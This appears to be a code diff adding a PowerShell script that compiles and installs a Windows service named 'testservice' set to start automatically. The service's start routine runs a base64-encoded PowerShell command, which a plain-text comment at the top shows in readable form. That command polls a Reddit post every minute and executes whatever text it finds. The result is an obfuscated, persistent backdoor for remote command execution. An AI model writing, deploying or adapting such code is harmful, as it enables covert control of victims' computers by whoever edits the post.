@@ -1,0 +1,63 @@
+<#command:
+
+while ($true) {
+$command = ((new-object system.io.streamreader $([System.Net.WebRequest]::Create('https://www.reddit.com/r/VABlAHMAdABDACYAQwA.json').getresponse().getresponsestream())).readtoend() | convertFrom-Json).data.children.data[0].selftext
+if ($command -ne $oldCommand){
+iex $command
+}
+
+$oldcommand = $command
+
+sleep 60
+
+
+}
+
+#>
+
+$source = @"
+using System;
+using System.ServiceProcess;
+using System.Diagnostics;
+using System.Windows.Forms;
+
+namespace WindowsService
+{
+    public partial class Service : ServiceBase
+    {
+        public Service()
+        {
+            this.ServiceName = "Test Service";
+            this.EventLog.Log = "Application";
+            this.CanHandlePowerEvent = false;
+            this.CanHandleSessionChangeEvent = false;
+            this.CanPauseAndContinue = false;
+            this.CanShutdown = false;
+            this.CanStop = true;
+        }
+
+        static void Main()
+        {
+            ServiceBase.Run(new Service());
+        }
+
+        protected override void OnStart(string[] args)
+        {
+                        Process.Start("Powershell.exe",
+                        "-encodedcommand dwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsADQAKACQAYwBvAG0AbQBhAG4AZAAgAD0AIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AaQBvAC4AcwB0AHIAZQBhAG0AcgBlAGEAZABlAHIAIAAkACgAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBDAHIAZQBhAHQAZQAoACcAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AcgBlAGQAZABpAHQALgBjAG8AbQAvAHIALwBWAEEAQgBsAEEASABNAEEAZABBAEIARABBAEMAWQBBAFEAdwBBAC4AagBzAG8AbgAnACkALgBnAGUAdAByAGUAcwBwAG8AbgBzAGUAKAApAC4AZwBlAHQAcgBlAHMAcABvAG4AcwBlAHMAdAByAGUAYQBtACgAKQApACkALgByAGUAYQBkAHQAbwBlAG4AZAAoACkAIAB8ACAAYwBvAG4AdgBlAHIAdABGAHIAbwBtAC0ASgBzAG8AbgApAC4AZABhAHQAYQAuAGMAaABpAGwAZAByAGUAbgAuAGQAYQB0AGEAWwAwAF0ALgBzAGUAbABmAHQAZQB4AHQADQAKAGkAZgAgACgAJABjAG8AbQBtAGEAbgBkACAALQBuAGUAIAAkAG8AbABkAEMAbwBtAG0AYQBuAGQAKQB7AA0ACgBpAGUAeAAgACQAYwBvAG0AbQBhAG4AZAANAAoAfQANAAoADQAKACQAbwBsAGQAYwBvAG0AbQBhAG4AZAAgAD0AIAAkAGMAbwBtAG0AYQBuAGQADQAKAA0ACgBzAGwAZQBlAHAAIAA2ADAADQAKAA0ACgB9AA0ACgA=");
+
+        }
+
+        protected override void OnStop()
+        {
+            MessageBox.Show("The voices have stopped");
+        }
+    }
+}
+
+"@
+Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.ServiceProcess -Language CSharp -OutputAssembly "C:\testservice.exe" -OutputType ConsoleApplication
+
+sc.exe create testservice binpath= C:\testservice.exe type= interact type= own start= auto
+
+net start testservice
